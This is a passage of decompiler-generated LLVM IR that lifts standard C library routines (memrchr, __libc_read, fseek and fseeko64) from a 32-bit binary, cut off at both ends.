dec_label_pc_804f988:                             ; preds = %dec_label_pc_804f97f.dec_label_pc_804f988_crit_edge, %dec_label_pc_804f983
  %v0_804f988 = phi i32 [ %phitmp, %dec_label_pc_804f97f.dec_label_pc_804f988_crit_edge ], [ 0, %dec_label_pc_804f983 ]
  %v8_804f988 = icmp eq i32 %v0_804f988, 0
  store i1 %v8_804f988, i1* %zf.global-to-local, align 1
  store i32 %v0_804f988, i32* %edi.global-to-local, align 4
  %v2_804f98d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f98b

dec_label_pc_804f98b:                             ; preds = %entry, %dec_label_pc_804f988
  %v2_804f98d = phi i32 [ %v0_804f96c, %entry ], [ %v2_804f98d.pre, %dec_label_pc_804f988 ]
  %v0_804f98b = phi i32 [ 0, %entry ], [ %v0_804f988, %dec_label_pc_804f988 ]
  store i32 %v2_804f98d, i32* @edi, align 4
  ret i32 %v0_804f98b

; uselistorder directives
  uselistorder i32 %v0_804f988, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804f98b, { 1, 0 }
  uselistorder label %dec_label_pc_804f988, { 1, 0 }
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_804f995 = urem i32 %arg2, 256
  %v4_804f9a1 = sext i8 %arg1 to i32
  %v2_804f9a5 = add i32 %v4_804f9a1, %arg3
  %v1_804f9b76 = icmp eq i32 %arg3, 0
  br i1 %v1_804f9b76, label %dec_label_pc_804f9bf, label %dec_label_pc_804f9bb

dec_label_pc_804f9a9:                             ; preds = %dec_label_pc_804f9bb
  %v1_804f9a9 = add i32 %v0_804f9a9, -1
  %v5_804f9aa = load i32, i32* @edx, align 4
  %v6_804f9aa = and i32 %v5_804f9aa, -256
  %v7_804f9aa = or i32 %v6_804f9aa, %v4_804f995
  store i32 %v7_804f9aa, i32* @edx, align 4
  %v1_804f9ae = inttoptr i32 %v1_804f9a9 to i8*
  %v2_804f9ae = load i8, i8* %v1_804f9ae, align 1
  %v15_804f9ae = icmp eq i8 %v2_804f9ae, %tmp
  br i1 %v15_804f9ae, label %dec_label_pc_804fa3c, label %dec_label_pc_804f9b6

dec_label_pc_804f9b6:                             ; preds = %dec_label_pc_804f9a9
  %v1_804f9b6 = add i32 %v0_804f9b6, -1
  %v8_804f9b6 = icmp eq i32 %v1_804f9b6, 0
  br i1 %v8_804f9b6, label %dec_label_pc_804f9bf, label %dec_label_pc_804f9bb

dec_label_pc_804f9bb:                             ; preds = %entry, %dec_label_pc_804f9b6
  %v0_804f9b6 = phi i32 [ %v1_804f9b6, %dec_label_pc_804f9b6 ], [ %arg3, %entry ]
  %v0_804f9a9 = phi i32 [ %v1_804f9a9, %dec_label_pc_804f9b6 ], [ %v2_804f9a5, %entry ]
  %v2_804f9bb = urem i32 %v0_804f9a9, 4
  %v3_804f9bb = icmp eq i32 %v2_804f9bb, 0
  %v1_804f9bd = icmp eq i1 %v3_804f9bb, false
  br i1 %v1_804f9bd, label %dec_label_pc_804f9a9, label %dec_label_pc_804f9bf

dec_label_pc_804f9bf:                             ; preds = %dec_label_pc_804f9b6, %dec_label_pc_804f9bb, %entry
  %v0_804fa22.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_804f9b6 ], [ %v0_804f9b6, %dec_label_pc_804f9bb ]
  %v0_804f9c4 = phi i32 [ %v2_804f9a5, %entry ], [ %v1_804f9a9, %dec_label_pc_804f9b6 ], [ %v0_804f9a9, %dec_label_pc_804f9bb ]
  store i32 %v0_804f9c4, i32* @ecx, align 4
  %v2_804f9c8 = mul nuw nsw i32 %v4_804f995, 256
  %v2_804f9cb = or i32 %v2_804f9c8, %v4_804f995
  %v2_804f9cf = mul i32 %v2_804f9cb, 65536
  %v2_804f9d2 = or i32 %v2_804f9cf, %v2_804f9cb
  %v6_804fa2549 = icmp ugt i32 %v0_804fa22.pr, 3
  br i1 %v6_804fa2549, label %dec_label_pc_804f9d6, label %dec_label_pc_804fa27

dec_label_pc_804f9d6:                             ; preds = %dec_label_pc_804f9bf, %dec_label_pc_804fa1f
  %v0_804fa1f51 = phi i32 [ %v1_804fa1f, %dec_label_pc_804fa1f ], [ %v0_804fa22.pr, %dec_label_pc_804f9bf ]
  %v0_804f9d650 = phi i32 [ %v1_804f9d6, %dec_label_pc_804fa1f ], [ %v0_804f9c4, %dec_label_pc_804f9bf ]
  %v1_804f9d6 = add i32 %v0_804f9d650, -4
  store i32 %v1_804f9d6, i32* @ecx, align 4
  %v2_804f9db = inttoptr i32 %v1_804f9d6 to i32*
  %v3_804f9db = load i32, i32* %v2_804f9db, align 4
  %v4_804f9db = xor i32 %v3_804f9db, %v2_804f9d2
  %v1_804f9dd = add i32 %v4_804f9db, 2130640639
  %v1_804f9e3 = sub i32 -1, %v4_804f9db
  %v2_804f9e5 = xor i32 %v1_804f9dd, %v1_804f9e3
  %v1_804f9e7 = and i32 %v2_804f9e5, -2130640640
  %v2_804f9e7 = icmp eq i32 %v1_804f9e7, 0
  br i1 %v2_804f9e7, label %dec_label_pc_804fa1f, label %dec_label_pc_804f9ef

dec_label_pc_804f9ef:                             ; preds = %dec_label_pc_804f9d6
  %v7_804f9ef = or i32 %v1_804f9e7, %v4_804f995
  %v1_804f9f3 = add i32 %v0_804f9d650, -1
  %v2_804f9f6 = inttoptr i32 %v1_804f9f3 to i8*
  %v3_804f9f6 = load i8, i8* %v2_804f9f6, align 1
  %v16_804f9f6 = icmp eq i8 %v3_804f9f6, %tmp
  br i1 %v16_804f9f6, label %dec_label_pc_804fa3c, label %dec_label_pc_804f9fb

dec_label_pc_804f9fb:                             ; preds = %dec_label_pc_804f9ef
  %v1_804f9ff = add i32 %v0_804f9d650, -2
  %v2_804fa02 = inttoptr i32 %v1_804f9ff to i8*
  %v3_804fa02 = load i8, i8* %v2_804fa02, align 1
  %v16_804fa02 = icmp eq i8 %v3_804fa02, %tmp
  br i1 %v16_804fa02, label %dec_label_pc_804fa3c, label %dec_label_pc_804fa07

dec_label_pc_804fa07:                             ; preds = %dec_label_pc_804f9fb
  %v1_804fa0b = add i32 %v0_804f9d650, -3
  %v2_804fa0e = inttoptr i32 %v1_804fa0b to i8*
  %v3_804fa0e = load i8, i8* %v2_804fa0e, align 1
  %v16_804fa0e = icmp eq i8 %v3_804fa0e, %tmp
  br i1 %v16_804fa0e, label %dec_label_pc_804fa3c, label %dec_label_pc_804fa13

dec_label_pc_804fa13:                             ; preds = %dec_label_pc_804fa07
  %v1_804fa17 = inttoptr i32 %v1_804f9d6 to i8*
  %v2_804fa17 = load i8, i8* %v1_804fa17, align 1
  %v15_804fa17 = icmp eq i8 %v2_804fa17, %tmp
  %v1_804fa19 = icmp eq i1 %v15_804fa17, false
  br i1 %v1_804fa19, label %dec_label_pc_804fa1f, label %dec_label_pc_804fa1b

dec_label_pc_804fa1b:                             ; preds = %dec_label_pc_804fa13
  br label %dec_label_pc_804fa3c

dec_label_pc_804fa1f:                             ; preds = %dec_label_pc_804fa13, %dec_label_pc_804f9d6
  %v5_804fa2c26 = phi i32 [ %v7_804f9ef, %dec_label_pc_804fa13 ], [ 0, %dec_label_pc_804f9d6 ]
  %v1_804fa1f = add i32 %v0_804fa1f51, -4
  %v6_804fa25 = icmp ugt i32 %v1_804fa1f, 3
  br i1 %v6_804fa25, label %dec_label_pc_804f9d6, label %dec_label_pc_804fa27

dec_label_pc_804fa27:                             ; preds = %dec_label_pc_804fa1f, %dec_label_pc_804f9bf
  %v5_804fa2c25.lcssa = phi i32 [ %v4_804f995, %dec_label_pc_804f9bf ], [ %v5_804fa2c26, %dec_label_pc_804fa1f ]
  %v0_804f9d6.lcssa = phi i32 [ %v0_804f9c4, %dec_label_pc_804f9bf ], [ %v1_804f9d6, %dec_label_pc_804fa1f ]
  %v0_804fa1f.lcssa = phi i32 [ %v0_804fa22.pr, %dec_label_pc_804f9bf ], [ %v1_804fa1f, %dec_label_pc_804fa1f ]
  br label %dec_label_pc_804fa34

dec_label_pc_804fa2b:                             ; preds = %dec_label_pc_804fa34
  %v1_804fa34 = add i32 %v0_804fa34, -1
  %v1_804fa2b = add i32 %v0_804fa2b, -1
  %v6_804fa2c = and i32 %v5_804fa2c, -256
  %v7_804fa2c = or i32 %v6_804fa2c, %v4_804f995
  %v1_804fa30 = inttoptr i32 %v1_804fa2b to i8*
  %v2_804fa30 = load i8, i8* %v1_804fa30, align 1
  %v15_804fa30 = icmp eq i8 %v2_804fa30, %tmp
  br i1 %v15_804fa30, label %dec_label_pc_804fa3c, label %dec_label_pc_804fa34

dec_label_pc_804fa34:                             ; preds = %dec_label_pc_804fa2b, %dec_label_pc_804fa27
  %v5_804fa2c = phi i32 [ %v7_804fa2c, %dec_label_pc_804fa2b ], [ %v5_804fa2c25.lcssa, %dec_label_pc_804fa27 ]
  %v0_804fa2b = phi i32 [ %v1_804fa2b, %dec_label_pc_804fa2b ], [ %v0_804f9d6.lcssa, %dec_label_pc_804fa27 ]
  %v0_804fa34 = phi i32 [ %v1_804fa34, %dec_label_pc_804fa2b ], [ %v0_804fa1f.lcssa, %dec_label_pc_804fa27 ]
  %v10_804fa35 = icmp eq i32 %v0_804fa34, 0
  %v1_804fa38 = icmp eq i1 %v10_804fa35, false
  br i1 %v1_804fa38, label %dec_label_pc_804fa2b, label %dec_label_pc_804fa3a

dec_label_pc_804fa3a:                             ; preds = %dec_label_pc_804fa34
  br label %dec_label_pc_804fa3c

dec_label_pc_804fa3c:                             ; preds = %dec_label_pc_804f9a9, %dec_label_pc_804fa07, %dec_label_pc_804f9fb, %dec_label_pc_804f9ef, %dec_label_pc_804fa2b, %dec_label_pc_804fa1b, %dec_label_pc_804fa3a
  %v0_804fa3f = phi i32 [ %v1_804f9d6, %dec_label_pc_804fa1b ], [ 0, %dec_label_pc_804fa3a ], [ %v1_804fa2b, %dec_label_pc_804fa2b ], [ %v1_804fa0b, %dec_label_pc_804fa07 ], [ %v1_804f9ff, %dec_label_pc_804f9fb ], [ %v1_804f9f3, %dec_label_pc_804f9ef ], [ %v1_804f9a9, %dec_label_pc_804f9a9 ]
  ret i32 %v0_804fa3f

; uselistorder directives
  uselistorder i32 %v0_804fa34, { 1, 0 }
  uselistorder i32 %v1_804fa1f, { 0, 2, 1 }
  uselistorder i32 %v1_804f9d6, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_804f9d650, { 3, 2, 1, 0 }
  uselistorder i32 %v2_804f9cb, { 1, 0 }
  uselistorder i32 %v0_804f9a9, { 1, 0, 2 }
  uselistorder i32 %v2_804f9a5, { 1, 0 }
  uselistorder i32 %v4_804f995, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 2, 6, 12, 13, 1, 0, 7, 8, 9, 14, 18, 15, 16, 17, 3, 5, 4, 10, 11 }
  uselistorder i32 65536, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10, 11, 12, 13, 15, 16, 14, 17, 23, 18, 19, 20, 21, 24, 27, 22, 25, 26 }
  uselistorder i32 -256, { 15, 16, 17, 18, 19, 20, 21, 22, 23, 56, 24, 25, 26, 27, 28, 0, 29, 30, 1, 31, 32, 33, 83, 3, 57, 2, 58, 34, 35, 59, 61, 84, 5, 49, 48, 4, 62, 63, 64, 65, 8, 66, 6, 67, 7, 68, 75, 10, 51, 50, 9, 52, 53, 54, 69, 85, 70, 71, 47, 60, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 55, 73, 72, 74, 80, 77, 12, 78, 13, 79, 11, 76, 14, 81, 82 }
  uselistorder i32 256, { 1, 2, 3, 4, 42, 43, 5, 44, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 47, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 54, 29, 30, 31, 46, 32, 48, 52, 49, 33, 34, 53, 35, 36, 0, 50, 51, 45, 37, 38, 39, 40, 41 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fa3c, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804f9d6, { 1, 0 }
  uselistorder label %dec_label_pc_804f9bf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f9bb, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa40 = load i32, i32* @edi, align 4
  store i32 %v0_804fa40, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fa50 = load i32, i32* @ebx, align 4
  %v4_804fa58 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804fa50, i32* @ebx, align 4
  store i32 %v4_804fa58, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804fa58, -4095
  br i1 %tmp11, label %dec_label_pc_804fa70, label %dec_label_pc_804fa64

dec_label_pc_804fa64:                             ; preds = %entry
  %v1_804fa64 = call i32 @__errno_location(i32 %v0_804fa50)
  %v0_804fa69 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa69 = sub i32 0, %v0_804fa69
  %v2_804fa6b = inttoptr i32 %v1_804fa64 to i32*
  store i32 %v1_804fa69, i32* %v2_804fa6b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa70

dec_label_pc_804fa70:                             ; preds = %entry, %dec_label_pc_804fa64
  %v0_804fa70 = phi i32 [ %v4_804fa58, %entry ], [ -1, %dec_label_pc_804fa64 ]
  %v2_804fa74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa74, i32* @edi, align 4
  ret i32 %v0_804fa70

; uselistorder directives
  uselistorder i32 %v4_804fa58, { 1, 0, 2 }
  uselistorder i32 %v0_804fa50, { 1, 0 }
  uselistorder label %dec_label_pc_804fa70, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fa83 = ashr i32 %arg2, 31
  %v4_804fa8a = inttoptr i32 %arg1 to i16*
  %v5_804fa8a = call i32 @__GI_fseeko64(i16* %v4_804fa8a, i32 %arg2, i32 %v1_804fa83, i32 %arg3)
  ret i32 %v5_804fa8a
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804fa94 = load i32, i32* @ebp, align 4
  %v0_804fa95 = load i32, i32* @edi, align 4
  %v0_804fa96 = load i32, i32* @esi, align 4
  %v0_804fa97 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_804faa7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804faa7, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_804facb, label %dec_label_pc_804fab8

dec_label_pc_804fab8:                             ; preds = %entry
  %v1_804fab8 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_804fab8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_804fac0 = inttoptr i32 %v1_804fab8 to i32*
  store i32 22, i32* %v1_804fac0, align 4
  br label %dec_label_pc_804fb6d

dec_label_pc_804facb:                             ; preds = %entry
  %v1_804facb = add i32 %v4_804faa7, 52
  %v2_804facb = inttoptr i32 %v1_804facb to i32*
  %v3_804facb = load i32, i32* %v2_804facb, align 4
  %v1_804face = icmp eq i32 %v3_804facb, 0
  %v1_804fad0 = icmp eq i1 %v1_804face, false
  br i1 %v1_804fad0, label %dec_label_pc_804faf1, label %dec_label_pc_804fad2

dec_label_pc_804fad2:                             ; preds = %dec_label_pc_804facb
  %v1_804fad2 = add i32 %v4_804faa7, 56
  store i32 %v1_804fad2, i32* @ebx, align 4
  %v2_804fadc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fadc, i32* @eax, align 4
  %v3_804fae1 = call i32 @__pthread_return_void(i32 %v2_804fadc, i32 134526427)
  store i32 %v3_804fae1, i32* %eax.global-to-local, align 4
  %v0_804fae6 = load i32, i32* @ebx, align 4
  %v2_804fae9 = call i32 @__pthread_return_0(i32 %v0_804fae6)
  store i32 %v2_804fae9, i32* %eax.global-to-local, align 4
  %v0_804faf1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804faf1

dec_label_pc_804faf1:                             ; preds = %dec_label_pc_804facb, %dec_label_pc_804fad2
  %v0_804faf9 = phi i32 [ %v4_804faa7, %dec_label_pc_804facb ], [ %v0_804faf1.pre, %dec_label_pc_804fad2 ]
  %v1_804faf1 = inttoptr i32 %v0_804faf9 to i8*
  %v2_804faf1 = load i8, i8* %v1_804faf1, align 1
  %v3_804faf1 = and i8 %v2_804faf1, 64
  %v4_804faf1 = icmp eq i8 %v3_804faf1, 0
  br i1 %v4_804faf1, label %dec_label_pc_804fb06, label %dec_label_pc_804faf6

dec_label_pc_804faf6:                             ; preds = %dec_label_pc_804faf1
  %v2_804fafa = call i32 @__stdio_wcommit(i32 %v0_804faf9)
  store i32 %v2_804fafa, i32* %eax.global-to-local, align 4
  %v1_804fb02 = icmp eq i32 %v2_804fafa, 0
  %v1_804fb04 = icmp eq i1 %v1_804fb02, false
  br i1 %v1_804fb04, label %dec_label_pc_804fb55, label %dec_label_pc_804fb06

dec_label_pc_804fb06:                             ; preds = %dec_label_pc_804faf6, %dec_label_pc_804faf1
  %v0_804fb06 = load i32, i32* @edi, align 4
  %v9_804fb06 = icmp eq i32 %v0_804fb06, 1
  %v1_804fb09 = icmp eq i1 %v9_804fb06, false
  br i1 %v1_804fb09, label %dec_label_pc_804fb06.dec_label_pc_804fb1f_crit_edge, label %dec_label_pc_804fb0b

dec_label_pc_804fb06.dec_label_pc_804fb1f_crit_edge: ; preds = %dec_label_pc_804fb06
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804fb1f

dec_label_pc_804fb0b:                             ; preds = %dec_label_pc_804fb06
  %v0_804fb0b = load i32, i32* @ecx, align 4
  %v2_804fb0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804fb0d, i32* %eax.global-to-local, align 4
  %v0_804fb12 = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_804fb12 to i32*
  %v6_804fb13 = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_804fb0d, i32 %v0_804fb0b, i32 %v0_804fb0b)
  store i32 %v6_804fb13, i32* %eax.global-to-local, align 4
  %v2_804fb1b = icmp slt i32 %v6_804fb13, 0
  br i1 %v2_804fb1b, label %dec_label_pc_804fb55, label %dec_label_pc_804fb0b.dec_label_pc_804fb1f_crit_edge

dec_label_pc_804fb0b.dec_label_pc_804fb1f_crit_edge: ; preds = %dec_label_pc_804fb0b
  %v0_804fb20.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fb1f

dec_label_pc_804fb1f:                             ; preds = %dec_label_pc_804fb06.dec_label_pc_804fb1f_crit_edge, %dec_label_pc_804fb0b.dec_label_pc_804fb1f_crit_edge
  %v2_804fb21.pre-phi = phi i32 [ %.pre6, %dec_label_pc_804fb06.dec_label_pc_804fb1f_crit_edge ], [ %v2_804fb0d, %dec_label_pc_804fb0b.dec_label_pc_804fb1f_crit_edge ]
  %v0_804fb20 = phi i32 [ %v0_804fb06, %dec_label_pc_804fb06.dec_label_pc_804fb1f_crit_edge ], [ %v0_804fb20.pre, %dec_label_pc_804fb0b.dec_label_pc_804fb1f_crit_edge ]
  %v0_804fb1f = load i32, i32* @edx, align 4
  store i32 %v2_804fb21.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804fb26 = load i32, i32* @esi, align 4
  %v5_804fb27 = inttoptr i32 %v2_804fb21.pre-phi to i32*
  %v6_804fb27 = call i32 @__stdio_seek(i32 %v0_804fb26, i32* %v5_804fb27, i32 %v0_804fb20, i32 %v0_804fb1f)
  store i32 %v6_804fb27, i32* %eax.global-to-local, align 4
  %v2_804fb2f = icmp slt i32 %v6_804fb27, 0
  br i1 %v2_804fb2f, label %dec_label_pc_804fb55, label %dec_label_pc_804fb33

dec_label_pc_804fb33:                             ; preds = %dec_label_pc_804fb1f
  %v0_804fb33 = load i32, i32* @esi, align 4
  %v1_804fb33 = inttoptr i32 %v0_804fb33 to i16*
  %v2_804fb33 = load i16, i16* %v1_804fb33, align 2
  %v3_804fb33 = and i16 %v2_804fb33, -72
  store i16 %v3_804fb33, i16* %v1_804fb33, align 2
  %v0_804fb37 = load i32, i32* @esi, align 4
  %v1_804fb37 = add i32 %v0_804fb37, 8
  %v2_804fb37 = inttoptr i32 %v1_804fb37 to i32*
  %v3_804fb37 = load i32, i32* %v2_804fb37, align 4
  store i32 %v3_804fb37, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_804fb3c = add i32 %v0_804fb37, 16
  %v3_804fb3c = inttoptr i32 %v2_804fb3c to i32*
  store i32 %v3_804fb37, i32* %v3_804fb3c, align 4
  %v0_804fb3f = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb3f = load i32, i32* @esi, align 4
  %v2_804fb3f = add i32 %v1_804fb3f, 20
  %v3_804fb3f = inttoptr i32 %v2_804fb3f to i32*
  store i32 %v0_804fb3f, i32* %v3_804fb3f, align 4
  %v0_804fb42 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb42 = load i32, i32* @esi, align 4
  %v2_804fb42 = add i32 %v1_804fb42, 24
  %v3_804fb42 = inttoptr i32 %v2_804fb42 to i32*
  store i32 %v0_804fb42, i32* %v3_804fb42, align 4
  %v0_804fb45 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb45 = load i32, i32* @esi, align 4
  %v2_804fb45 = add i32 %v1_804fb45, 28
  %v3_804fb45 = inttoptr i32 %v2_804fb45 to i32*
  store i32 %v0_804fb45, i32* %v3_804fb45, align 4
  %v0_804fb48 = load i32, i32* @esi, align 4
  %v1_804fb48 = add i32 %v0_804fb48, 44
  %v2_804fb48 = inttoptr i32 %v1_804fb48 to i32*
  store i32 0, i32* %v2_804fb48, align 4
  %v0_804fb4f = load i32, i32* @esi, align 4
  %v1_804fb4f = add i32 %v0_804fb4f, 2
  %v2_804fb4f = inttoptr i32 %v1_804fb4f to i8*
  store i8 0, i8* %v2_804fb4f, align 1
  br label %dec_label_pc_804fb58

dec_label_pc_804fb55:                             ; preds = %dec_label_pc_804fb1f, %dec_label_pc_804fb0b, %dec_label_pc_804faf6
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb58

dec_label_pc_804fb58:                             ; preds = %dec_label_pc_804fb33, %dec_label_pc_804fb55
  br i1 %v1_804fad0, label %dec_label_pc_804fb6d, label %dec_label_pc_804fb5c

dec_label_pc_804fb5c:                             ; preds = %dec_label_pc_804fb58
  %v2_804fb60 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fb60, i32* @eax, align 4
  %v3_804fb65 = call i32 @__pthread_return_void(i32 %v2_804fb60, i32 1)
  store i32 %v3_804fb65, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fb6d

dec_label_pc_804fb6d:                             ; preds = %dec_label_pc_804fb58, %dec_label_pc_804fab8, %dec_label_pc_804fb5c
  %v0_804fb70 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fb70, i32* %eax.global-to-local, align 4
  store i32 %v0_804fa97, i32* @ebx, align 4
  store i32 %v0_804fa96, i32* @esi, align 4
  store i32 %v0_804fa95, i32* @edi, align 4
  store i32 %v0_804fa94, i32* @ebp, align 4
  ret i32 %v0_804fb70

; uselistorder directives
  uselistorder i32 %v2_804fb21.pre-phi, { 1, 0 }
  uselistorder i32 %v0_804fb06, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 28, { 7, 8, 18, 9, 10, 11, 12, 13, 14, 0, 15, 19, 20, 16, 17, 21, 22, 32, 23, 33, 31, 24, 25, 2, 26, 27, 28, 29, 30, 3, 4, 5, 1, 6 }
  uselistorder i32 24, { 3, 4, 14, 15, 16, 5, 6, 7, 8, 9, 10, 11, 17, 18, 19, 22, 1, 20, 0, 2, 12, 21, 13 }
  uselistorder i32* @ecx, { 36, 37, 38, 29, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 25, 65, 66, 67, 68, 111, 69, 70, 26, 71, 23, 27, 4, 6, 24, 5, 112, 113, 114, 115, 72, 73, 74, 75, 76, 77, 78, 28, 79, 7, 80, 81, 82, 83, 84, 13, 14, 0, 1, 85, 86, 15, 87, 88, 89, 90, 91, 93, 94, 95, 96, 34, 35, 92, 116, 117, 16, 118, 119, 120, 121, 17, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 97, 102, 98, 99, 100, 101, 138, 8, 9, 103, 2, 104, 139, 201, 140, 11, 20, 141, 142, 18, 10, 19, 143, 144, 145, 146, 147, 148, 197, 198, 199, 200, 12, 105, 3, 106, 30, 202, 203, 208, 107, 108, 109, 110, 204, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 21, 175, 150, 151, 152, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 22, 190, 191, 193, 194, 195, 192, 205, 149, 31, 206, 207, 32, 33, 196, 209 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 1, 5, 4, 3, 2, 0 }
  uselistorder i8 0, { 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0, 62, 63, 64, 111, 65, 29, 3, 6, 7, 30, 5, 4, 112, 113, 114, 66, 67, 40, 68, 115, 69, 70, 71, 72, 73, 74, 75, 8, 76, 77, 9, 78, 79, 80, 81, 82, 83, 84, 85, 42, 176, 86, 11, 121, 116, 117, 10, 119, 120, 118, 26, 122, 1, 2, 87, 88, 123, 124, 28, 126, 12, 14, 102, 101, 13, 31, 127, 128, 129, 130, 131, 132, 133, 177, 134, 135, 136, 137, 138, 17, 144, 140, 141, 139, 15, 142, 143, 16, 27, 145, 146, 147, 148, 149, 150, 151, 166, 167, 19, 104, 103, 18, 105, 106, 152, 178, 180, 107, 32, 41, 108, 20, 179, 154, 155, 156, 157, 158, 159, 160, 161, 162, 33, 163, 99, 125, 89, 21, 90, 91, 92, 93, 94, 95, 96, 97, 98, 100, 109, 110, 153, 164, 165, 168, 169, 174, 173, 22, 170, 171, 24, 172, 23, 175, 25, 43, 34, 35, 36, 37, 38, 39 }
  uselistorder i8 64, { 1, 0, 2, 3, 4, 7, 5, 6 }
  uselistorder i32 (i32)* @__pthread_return_0, { 30, 26, 25, 24, 23, 22, 21, 5, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 4, 8, 29, 28, 27, 3, 2, 1, 6, 0, 7 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 53, 52, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 9, 8, 51, 50, 49, 48, 47, 46, 5, 4, 3, 0, 7, 6 }
  uselistorder i32 134526427, { 2, 17, 18, 3, 4, 5, 6, 19, 20, 21, 22, 7, 8, 24, 25, 26, 27, 28, 29, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 23 }
  uselistorder i32 56, { 2, 0, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 1 }
  uselistorder i32 52, { 5, 6, 7, 13, 8, 9, 1, 10, 0, 2, 3, 4, 11, 12 }
  uselistorder i32 22, { 1, 2, 3, 8, 10, 11, 0, 4, 5, 6, 7, 9 }
  uselistorder i32* @esi, { 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 49, 50, 51, 52, 53, 0, 54, 143, 144, 145, 146, 147, 148, 33, 149, 55, 10, 56, 34, 30, 284, 285, 286, 287, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 12, 68, 1, 70, 71, 72, 73, 11, 74, 75, 69, 76, 77, 78, 79, 2, 80, 81, 82, 83, 84, 85, 31, 13, 86, 87, 14, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 15, 105, 106, 107, 16, 37, 88, 3, 89, 90, 108, 109, 110, 111, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 35, 112, 113, 17, 7, 119, 114, 115, 116, 117, 118, 169, 18, 170, 171, 175, 172, 173, 174, 182, 176, 177, 178, 179, 180, 181, 288, 19, 289, 290, 183, 184, 185, 186, 187, 188, 189, 20, 8, 190, 191, 192, 193, 194, 21, 32, 195, 196, 197, 198, 199, 200, 22, 201, 202, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 